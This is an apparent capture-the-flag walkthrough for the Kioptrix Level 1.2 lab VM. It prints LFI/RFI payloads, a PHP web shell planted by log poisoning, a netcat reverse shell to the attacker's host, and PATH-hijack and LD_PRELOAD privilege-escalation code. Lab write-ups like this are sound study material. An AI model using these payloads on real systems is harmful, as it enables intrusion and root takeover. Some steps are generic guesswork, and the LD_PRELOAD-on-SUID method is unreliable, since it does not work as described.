# Kioptrix Level 1.2 (#3): OSCP Walkthrough

**Machine:** Kioptrix Level 1.2 (#3)  
**Download:** [VulnHub: Kioptrix Level 1.2](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)  
**Difficulty:** Beginner  
**OS:** Linux (Fedora / CentOS-based)  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Web Application Analysis: LFI / RFI](#3-web-application-analysis--lfi--rfi)
4. [Exploitation: LFI to Code Execution](#4-exploitation--lfi-to-code-execution)
5. [Privilege Escalation: SUID Misconfiguration](#5-privilege-escalation--suid-misconfiguration)
6. [Key Takeaways](#6-key-takeaways)
7. [Screenshots](#7-screenshots)

---

## 1. Reconnaissance & Scanning

### Network Discovery

```bash
# Identify target on the local network
sudo netdiscover -r 192.168.1.0/24

# OR using arp-scan
sudo arp-scan --localnet

# OR using nmap ping sweep
nmap -sn 192.168.1.0/24
```

### Full Port Scan

```bash
# Thorough scan of all TCP ports
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Nmap Results

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.3p2
80/tcp   open  http        Apache httpd 2.2.3 (CentOS)
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Open Ports:**
| Port | Service | Version | Note |
|------|---------|---------|------|
| 22 | SSH | OpenSSH 4.3p2 | Older SSH version |
| 80 | HTTP | Apache 2.2.3 (CentOS) | **Primary attack vector** |

**Observation:** Only ports 22 and 80 open: a simpler attack surface compared to the previous Kioptrix machines.

---

## 2. Service Enumeration

### HTTP Service: Port 80

```bash
# HTTP headers
curl -I http://<TARGET_IP>

# Main page
curl http://<TARGET_IP>

# Technology identification
whatweb http://<TARGET_IP>

# Directory enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# OR
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
```

**whatweb output:**
```
http://<TARGET_IP> [200 OK] Apache[2.2.3], Country[RESERVED][ZZ], HTTPServer[CentOS], IP[<TARGET_IP>], JQuery[1.4.4], PHP[5.1.6], Script, Title[Kioptrix Level 1.2 - Welcome!]
```

### Web Application Exploration

Browse the web application. It appears to be a **custom CMS** with multiple sections:
- A login page (or member area)
- A news/display section
- URL parameters like `?page=` or `?id=` indicating dynamic content loading

```bash
# Check for common CMS indicators
curl http://<TARGET_IP>/robots.txt
curl http://<TARGET_IP>/README
curl http://<TARGET_IP>/CHANGELOG
```

---

## 3. Web Application Analysis: LFI / RFI

### Step 1: Identify File Inclusion Parameters

Look for PHP file inclusion parameters in URLs such as:
- `?page=`
- `?file=`
- `?include=`
- `?template=`
- `?inc=`
- `?show=`

```bash
# Check for LFI in URL parameters
curl http://<TARGET_IP>/index.php?page=index
curl http://<TARGET_IP>/?page=contact
```

### Step 2: Test for Local File Inclusion (LFI)

```bash
# Test with /etc/passwd
curl http://<TARGET_IP>/index.php?page=../../../../etc/passwd

# URL-encoded path traversal
curl http://<TARGET_IP>/index.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
curl http://<TARGET_IP>/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte injection (for PHP < 5.3.4)
curl http://<TARGET_IP>/index.php?page=../../../../etc/passwd%00
```

**Successful LFI:**
```bash
# Expected output - contents of /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
...
apache:x:48:48:Apache:/var/www:/sbin/nologin
```

### Step 3: Test for Remote File Inclusion (RFI)

Since `allow_url_include` might be enabled on older PHP versions (5.1.6), test for RFI:

```bash
# Set up a listener on Kali
echo "<?php system('id'); ?>" > shell.txt
python3 -m http.server 8000

# Test RFI
curl "http://<TARGET_IP>/index.php?page=http://<KALI_IP>:8000/shell.txt"
```

If RFI works, you'll see the output of the `id` command embedded in the page.

---

## 4. Exploitation: LFI to Code Execution

### Method A: LFI with PHP Wrappers (Log Poisoning)

If direct RFI fails, use LFI with **PHP wrappers**:

#### Step 1: Verify PHP wrappers work

```bash
# Read source code using php://filter
curl http://<TARGET_IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Decode the base64 output
echo "BASE64_OUTPUT" | base64 -d
```

#### Step 2: Log Poisoning via Apache Access Log

Inject PHP code into Apache logs using `nc` or `curl`:

```bash
# Send a crafted request with PHP code in the User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET_IP>/index.php

# Access the log through LFI and execute commands
curl "http://<TARGET_IP>/index.php?page=../../../../var/log/httpd/access_log&cmd=id"

# OR for CentOS/Fedora
curl "http://<TARGET_IP>/index.php?page=../../../../var/log/httpd/error_log&cmd=ls"
```

**Common log file paths to try:**
- `/var/log/httpd/access_log`
- `/var/log/httpd/error_log`
- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- `/proc/self/environ`

#### Step 3: Execute Commands through Log Poisoning

```bash
# Check current user
curl "http://<TARGET_IP>/index.php?page=../../../../var/log/httpd/access_log&cmd=whoami"

# Get a reverse shell
# First, set up netcat listener on Kali
nc -lvnp 4444

# Execute reverse shell payload through LFI
curl "http://<TARGET_IP>/index.php?page=../../../../var/log/httpd/access_log&cmd=nc -e /bin/bash <KALI_IP> 4444"
```

### Method B: LFI to PHP Session Injection

If the application uses PHP sessions:

```bash
# Check for PHPSESSID cookie
# The session files are typically stored in /tmp/sess_<SESSION_ID>

# Create a malicious session variable (e.g., by logging in with PHP code)
curl -X POST http://<TARGET_IP>/index.php \
  -d "username=<?php system('id'); ?>&password=test" \
  -c cookies.txt

# Extract session ID from cookies
cat cookies.txt

# Include the session file
curl "http://<TARGET_IP>/index.php?page=../../../../tmp/sess_<SESSION_ID>"
```

### Method C: Direct Shell Upload

If there's an admin panel or upload functionality in the web app, use that path instead.

---

## 5. Privilege Escalation

### Step 1: Post-Exploitation Enumeration

Once you have command execution (or a reverse shell):

```bash
# Spawn proper shell
python -c 'import pty; pty.spawn("/bin/bash")'
# OR
/bin/bash -i

# Current user
whoami
id

# System info
uname -a
cat /etc/redhat-release

# Kernel version
uname -r
```

### Step 2: SUID Enumeration

Check for **SUID binaries**: executables that run with the privileges of the file owner (often root):

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Or more specifically
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Look for unusual or custom SUID binaries**: things that don't come standard with the OS.

### Step 3: Identify the Vulnerable SUID Binary

Compare the SUID list with known vulnerable binaries:

```bash
# Common SUID binaries (standard)
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount

# Look for anything unusual like:
# /opt/bin/something
# /usr/local/bin/something
# /home/*/program
```

If you find a custom binary, examine it:

```bash
# Check what it does
strings <SUID_BINARY_PATH>

# Check file type
file <SUID_BINARY_PATH>
```

**In this machine**, there is often a custom SUID binary that can be exploited for root escalation. Common examples include:
- A custom `ht` or `httpd` wrapper
- A system tool with known SUID exploitation techniques
- A script that calls other programs with relative paths (PATH hijacking)

### Step 4: Exploit SUID Misconfiguration

#### Option A: Exploit via PATH Hijacking

If the SUID binary calls another program using a **relative path** (e.g., `system("ls")` without the full path `/bin/ls`):

```bash
# Find what commands the binary calls
strings <SUID_BINARY_PATH> | grep -E "system|exec|popen|cmd"

# Create a fake executable and modify PATH
cd /tmp
echo '#!/bin/bash' > ls
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> ls
chmod +x ls
export PATH=/tmp:$PATH

# Run the vulnerable SUID binary
<SUID_BINARY_PATH>

# Use the SUID bash
/tmp/rootbash -p
```

#### Option B: Exploit via Library Injection (LD_PRELOAD)

If the binary is dynamically linked and runs as root:

```bash
# Check if it's dynamically linked
ldd <SUID_BINARY_PATH>

# Create a shared library
cat > preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -o preload.so preload.c -nostartfiles

# Set LD_PRELOAD and run the binary
LD_PRELOAD=/tmp/preload.so <SUID_BINARY_PATH>
```

#### Option C: Standard Kernel Exploit

If the SUID path doesn't work, fall back to kernel exploitation:

```bash
# Check kernel version
uname -r
# e.g., 2.6.18-8.1.14.el5

# Search for exploits on Kali
searchsploit "linux kernel 2.6" fedora

# Transfer and run
# (Same methodology as Kioptrix Level 1 kernel exploit)
```

### Step 5: Confirm Root Access

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag
# or
cat /root/congrats.txt
```

---

## 6. Key Takeaways

1. **LFI/RFI is still prevalent**: Even simple file inclusion vulnerabilities can lead to full system compromise when combined with log poisoning or PHP wrappers.
2. **SUID misconfigurations**: Custom SUID binaries are a common privesc vector. Always check `find / -perm -4000 -type f 2>/dev/null` after gaining initial access.
3. **PHP wrappers are powerful**: `php://filter` for source code disclosure is a crucial OSCP technique.
4. **Log poisoning technique**: Injecting PHP code into Apache logs via User-Agent headers, then including those logs via LFI, remains a reliable RCE method.
5. **PATH hijacking**: When an SUID binary calls external programs without absolute paths, you can hijack the execution flow.
6. **Older PHP versions**: PHP 5.1.6 likely has `allow_url_include` and `register_globals` enabled, increasing the attack surface.
7. **Multiple exploitation paths**: This machine can be solved via LFI->log poisoning, RFI, or direct web app vulns, then escalated via SUID or kernel exploit.

---

## 7. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan results | *[Image: Nmap Scan]* |
| Web application main page | *[Image: Web App]* |
| LFI test showing /etc/passwd | *[Image: LFI Test]* |
| php://filter reading source code | *[Image: PHP Filter]* |
| Log poisoning RCE / reverse shell | *[Image: Log Poisoning]* |

---

## Quick Reference: Commands

| Phase | Command |
|-------|---------|
| Discovery | `sudo netdiscover -r 192.168.1.0/24` |
| Nmap Scan | `nmap -sS -sV -sC -p- -T4 -oN scan.txt <TARGET_IP>` |
| Web Tech | `whatweb http://<TARGET_IP>` |
| Dir Buster | `gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` |
| LFI Test | `curl http://<TARGET_IP>/index.php?page=../../../../etc/passwd` |
| RFI Test | `curl http://<TARGET_IP>/index.php?page=http://KALI_IP/shell.txt` |
| PHP Filter | `curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php"` |
| Log Poisoning | `curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/index.php` |
| RCE via Logs | `curl "http://TARGET/index.php?page=../../../../var/log/httpd/access_log&cmd=id"` |
| SUID Enum | `find / -perm -4000 -type f 2>/dev/null` |
| PATH Hijack | `export PATH=/tmp:\$PATH; <SUID_BINARY>` |

---

*M4d3 w1th ❤️ by Ankit Patidar*
